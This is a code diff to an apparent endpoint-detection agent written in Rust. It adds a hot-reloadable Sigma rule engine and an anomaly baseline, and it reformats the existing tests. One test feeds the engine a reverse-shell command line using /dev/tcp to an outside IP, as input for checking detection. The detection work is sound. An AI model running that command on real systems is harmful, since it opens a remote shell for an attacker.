@@ -21,6 +21,7 @@
 //! It never blocks the consumer: inspection is synchronous, allocation-light
 //! and lock-scoped to the beacon tracker only.
 
+mod baseline;
 mod beaconing;
 mod behavior;
 mod dns_tunnel;
@@ -28,6 +29,7 @@ pub mod honeytoken;
 mod ioa;
 mod ioc;
 mod netscan;
+pub mod sigma;
 
 #[cfg(feature = "yara")]
 pub mod yara_scanner;
@@ -38,7 +40,7 @@ use std::time::Instant;
 use tracing::{info, warn};
 
 use crate::schema::{
-    AgentEvent, DetectionData, EventAction, EventClass, EventData, Severity, SetuidData,
+    AgentEvent, DetectionData, EventAction, EventClass, EventData, SetuidData, Severity,
 };
 
 pub use ioc::IocSet;
@@ -54,6 +56,12 @@ pub struct DetectionEngine {
     dns_tunnel: Mutex<dns_tunnel::DnsTunnelTracker>,
     /// Stateful attack-chain correlation over the process tree (IOA).
     ioa: Mutex<ioa::IoaEngine>,
+    /// Compiled Sigma ruleset (disk baseline + backend-pushed), hot-swappable.
+    sigma: RwLock<sigma::SigmaEngine>,
+    /// Statistical behavioural baseline (process-lineage novelty + exec-rate).
+    baseline: Mutex<baseline::BaselineEngine>,
+    /// Runtime switch for the anomaly baseline (config `anomaly_detection_enabled`).
+    anomaly_enabled: std::sync::atomic::AtomicBool,
     started: Instant,
 }
 
@@ -78,13 +86,62 @@ impl DetectionEngine {
             netscan: Mutex::new(netscan::NetScanTracker::new()),
             dns_tunnel: Mutex::new(dns_tunnel::DnsTunnelTracker::new()),
             ioa: Mutex::new(ioa::IoaEngine::new()),
+            sigma: RwLock::new(Self::load_sigma_from_disk()),
+            baseline: Mutex::new(baseline::BaselineEngine::new()),
+            anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
             started: Instant::now(),
         }
+    }
+
+    /// Toggle the statistical anomaly baseline at runtime (config-driven).
+    pub fn set_anomaly_enabled(&self, on: bool) {
+        self.anomaly_enabled
+            .store(on, std::sync::atomic::Ordering::Relaxed);
     }
 
     /// Number of loaded IOCs (diagnostics / tests).
     pub fn ioc_count(&self) -> usize {
         self.iocs.read().map(|i| i.len()).unwrap_or(0)
+    }
+
+    /// Number of compiled Sigma rules currently loaded (diagnostics / tests).
+    pub fn sigma_count(&self) -> usize {
+        self.sigma.read().map(|s| s.len()).unwrap_or(0)
+    }
+
+    /// Compile the disk-resident Sigma baseline from `<config>/sigma/`.
+    fn load_sigma_from_disk() -> sigma::SigmaEngine {
+        let dir = crate::paths::config_dir().join("sigma");
+        let engine = sigma::SigmaEngine::from_dir(&dir);
+        if !engine.is_empty() {
+            info!(dir = %dir.display(), rules = engine.len(), "Sigma: disk baseline loaded");
+        }
+        engine
+    }
+
+    /// Recompile the Sigma ruleset = disk baseline + backend-pushed inline
+    /// rules. Called when a freshly-verified `AgentConfig` is applied, so the
+    /// backend can ship detections over the signed config channel without a
+    /// restart. Bad rules are reported but never disable the engine.
+    pub fn reload_sigma(&self, backend_docs: &[String]) {
+        let mut engine = Self::load_sigma_from_disk();
+        if !backend_docs.is_empty() {
+            let (dynamic, errors) = sigma::SigmaEngine::from_yaml_docs(backend_docs);
+            for e in &errors {
+                warn!(error = %e, "Sigma: skipping invalid backend rule");
+            }
+            let added = dynamic.len();
+            engine.extend(dynamic);
+            info!(
+                backend_rules = added,
+                total = engine.len(),
+                "Sigma: ruleset reloaded from config"
+            );
+        }
+        match self.sigma.write() {
+            Ok(mut g) => *g = engine,
+            Err(e) => warn!("Sigma: lock poisoned on reload: {e}"),
+        }
     }
 
     /// Reload the IOC feed from `<config>/iocs.json`.  Called periodically so a
@@ -128,14 +185,39 @@ impl DetectionEngine {
         let mut out = Vec::new();
         match &event.data {
             EventData::ProcessCreate(p) => {
-                self.inspect_process(&p.name, &p.exe, &p.cmdline, p.exe_sha256.as_deref(), &mut out);
+                self.inspect_process(
+                    &p.name,
+                    &p.exe,
+                    &p.cmdline,
+                    p.exe_sha256.as_deref(),
+                    &mut out,
+                );
             }
             EventData::ProcessExec(p) => {
-                self.inspect_process(&p.comm, &p.exe, &p.cmdline, p.exe_sha256.as_deref(), &mut out);
+                self.inspect_process(
+                    &p.comm,
+                    &p.exe,
+                    &p.cmdline,
+                    p.exe_sha256.as_deref(),
+                    &mut out,
+                );
                 if let Some(ref ld_preload) = p.ld_preload {
                     if let Some(d) = behavior::inspect_ld_preload(&p.comm, &p.exe, ld_preload) {
                         let sev = severity_for(d.confidence);
                         out.push(self.detection(sev, d));
+                    }
+                }
+                // Statistical behavioural baseline (config-gated): per-user
+                // binary novelty + exec-rate z-score, learned online.
+                if self
+                    .anomaly_enabled
+                    .load(std::sync::atomic::Ordering::Relaxed)
+                {
+                    if let Ok(mut b) = self.baseline.lock() {
+                        if let Some(d) = b.observe_exec(&p.username, &p.exe, Instant::now()) {
+                            let sev = severity_for(d.confidence);
+                            out.push(self.detection(sev, d));
+                        }
                     }
                 }
             }
@@ -157,6 +239,19 @@ impl DetectionEngine {
                 self.inspect_file_open(&f.path, &f.comm, &mut out);
             }
             _ => {}
+        }
+
+        // Sigma: evaluate the compiled ruleset against this event's field
+        // projection. Skipped cheaply when no rules are loaded or the event type
+        // carries no Sigma mapping.
+        if self.sigma.read().map(|s| !s.is_empty()).unwrap_or(false) {
+            if let Some(view) = sigma::fields::FieldView::from_event(event) {
+                if let Ok(engine) = self.sigma.read() {
+                    for rule in engine.evaluate(&view) {
+                        out.push(self.detection(rule.level, sigma_detection(rule, &view)));
+                    }
+                }
+            }
         }
 
         // Stateful IOA correlation. Updates the process tree from this event,
@@ -225,14 +320,14 @@ impl DetectionEngine {
             out.push(self.detection(
                 Severity::High,
                 DetectionData {
-                    rule_id:         "privesc.setuid_root".into(),
-                    title:           "Privilege escalation via setuid(0)".into(),
-                    category:        "privilege_escalation".into(),
-                    mitre_tactic:    Some("TA0004 Privilege Escalation".into()),
+                    rule_id: "privesc.setuid_root".into(),
+                    title: "Privilege escalation via setuid(0)".into(),
+                    category: "privilege_escalation".into(),
+                    mitre_tactic: Some("TA0004 Privilege Escalation".into()),
                     mitre_technique: Some("T1548.001".into()),
-                    confidence:      90,
-                    subject:         s.comm.clone(),
-                    detail:          format!(
+                    confidence: 90,
+                    subject: s.comm.clone(),
+                    detail: format!(
                         "PID {} ({}) set effective UID to 0 (was UID {})",
                         s.pid, s.comm, s.old_uid
                     ),
@@ -249,7 +344,11 @@ impl DetectionEngine {
 
     fn inspect_network(&self, dst_addr: &str, dst_port: u16, out: &mut Vec<AgentEvent>) {
         // IOC: known-bad destination IP.
-        let ip_hit = self.iocs.read().map(|i| i.match_ip(dst_addr)).unwrap_or(false);
+        let ip_hit = self
+            .iocs
+            .read()
+            .map(|i| i.match_ip(dst_addr))
+            .unwrap_or(false);
         if ip_hit {
             out.push(self.detection(
                 Severity::Critical,
@@ -364,7 +463,8 @@ impl DetectionEngine {
     fn inspect_file_open(&self, path: &str, comm: &str, out: &mut Vec<AgentEvent>) {
         // Sensitive credential-store access (logic + lists live in the
         // filesystem collector, mirroring how `behavior` owns its heuristics).
-        if let Some(d) = crate::collectors::linux::filesystem::inspect_sensitive_access(path, comm) {
+        if let Some(d) = crate::collectors::linux::filesystem::inspect_sensitive_access(path, comm)
+        {
             let sev = severity_for(d.confidence);
             out.push(self.detection(sev, d));
         }
@@ -448,6 +548,65 @@ fn inject_lineage(evidence: &mut serde_json::Value, lineage: &serde_json::Value)
     }
 }
 
+/// Translate a matched Sigma rule into the agent's detection record. The
+/// `subject` is the event's most identifying field (image/destination/file).
+fn sigma_detection(rule: &sigma::CompiledRule, view: &sigma::fields::FieldView) -> DetectionData {
+    let subject = view
+        .get("image")
+        .first()
+        .or_else(|| view.get("destinationip").first())
+        .or_else(|| view.get("targetfilename").first())
+        .or_else(|| view.get("query").first())
+        .cloned()
+        .unwrap_or_else(|| view.category.to_string());
+    // Map the Sigma severity ladder to a confidence so downstream auto-response
+    // thresholds behave consistently with native detections.
+    let confidence = match rule.level {
+        Severity::Critical => 90,
+        Severity::High => 80,
+        Severity::Medium => 60,
+        Severity::Low => 40,
+        Severity::Info => 20,
+    };
+    DetectionData {
+        rule_id: rule
+            .id
+            .clone()
+            .map(|id| format!("sigma.{id}"))
+            .unwrap_or_else(|| format!("sigma.{}", slugify(&rule.title))),
+        title: rule.title.clone(),
+        category: "sigma".into(),
+        mitre_tactic: rule.mitre_tactic.clone(),
+        mitre_technique: rule.mitre_technique.clone(),
+        confidence,
+        subject,
+        detail: format!("Sigma rule '{}' matched", rule.title),
+        evidence: serde_json::json!({
+            "sigma_title": rule.title,
+            "sigma_id": rule.id,
+            "tags": rule.tags,
+            "category": view.category,
+        }),
+    }
+}
+
+/// Lower-case, dash-separated slug of a rule title for a stable rule_id.
+fn slugify(s: &str) -> String {
+    s.chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() {
+                c.to_ascii_lowercase()
+            } else {
+                '-'
+            }
+        })
+        .collect::<String>()
+        .split('-')
+        .filter(|p| !p.is_empty())
+        .collect::<Vec<_>>()
+        .join("-")
+}
+
 fn severity_for(confidence: u8) -> Severity {
     match confidence {
         0..=39 => Severity::Low,
@@ -488,6 +647,9 @@ mod tests {
             netscan: Mutex::new(netscan::NetScanTracker::new()),
             dns_tunnel: Mutex::new(dns_tunnel::DnsTunnelTracker::new()),
             ioa: Mutex::new(ioa::IoaEngine::new()),
+            sigma: RwLock::new(sigma::SigmaEngine::empty()),
+            baseline: Mutex::new(baseline::BaselineEngine::new()),
+            anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
             started: Instant::now(),
         }
     }
@@ -541,7 +703,11 @@ mod tests {
     #[test]
     fn flags_reverse_shell_process() {
         let e = engine();
-        let out = e.inspect(&proc_event("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"));
+        let out = e.inspect(&proc_event(
+            "bash",
+            "/bin/bash",
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+        ));
         assert_eq!(out.len(), 1);
         assert!(matches!(out[0].class, EventClass::Detection));
     }
@@ -550,7 +716,9 @@ mod tests {
     fn flags_ioc_ip() {
         let e = engine();
         let out = e.inspect(&net_event("203.0.113.5", 443));
-        assert!(out.iter().any(|ev| matches!(&ev.data, EventData::Detection(d) if d.category == "ioc")));
+        assert!(out
+            .iter()
+            .any(|ev| matches!(&ev.data, EventData::Detection(d) if d.category == "ioc")));
     }
 
     #[test]
@@ -589,7 +757,9 @@ mod tests {
         );
         let out = e.inspect(&ev);
         assert!(
-            out.iter().any(|d| matches!(&d.data, EventData::Detection(dd) if dd.rule_id == "ioc.process_hash")),
+            out.iter().any(
+                |d| matches!(&d.data, EventData::Detection(dd) if dd.rule_id == "ioc.process_hash")
+            ),
             "a known-bad exe hash should fire ioc.process_hash"
         );
     }
@@ -606,7 +776,9 @@ mod tests {
         let e = engine();
         let out = e.inspect(&net_event("169.254.169.254", 80));
         assert!(
-            out.iter().any(|ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "cloud.imds_access")),
+            out.iter().any(
+                |ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "cloud.imds_access")
+            ),
             "connection to the cloud metadata endpoint should be flagged"
         );
     }
@@ -616,10 +788,9 @@ mod tests {
         let e = engine();
         let mut hit = false;
         for port in 1000..=1020u16 {
-            if e.inspect(&net_event("198.51.100.50", port))
-                .iter()
-                .any(|ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "recon.port_scan"))
-            {
+            if e.inspect(&net_event("198.51.100.50", port)).iter().any(
+                |ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "recon.port_scan"),
+            ) {
                 hit = true;
             }
         }
@@ -657,6 +828,9 @@ mod tests {
                 hit = true;
             }
         }
-        assert!(hit, "expected a beaconing verdict for a regular 60s cadence");
+        assert!(
+            hit,
+            "expected a beaconing verdict for a regular 60s cadence"
+        );
     }
 }
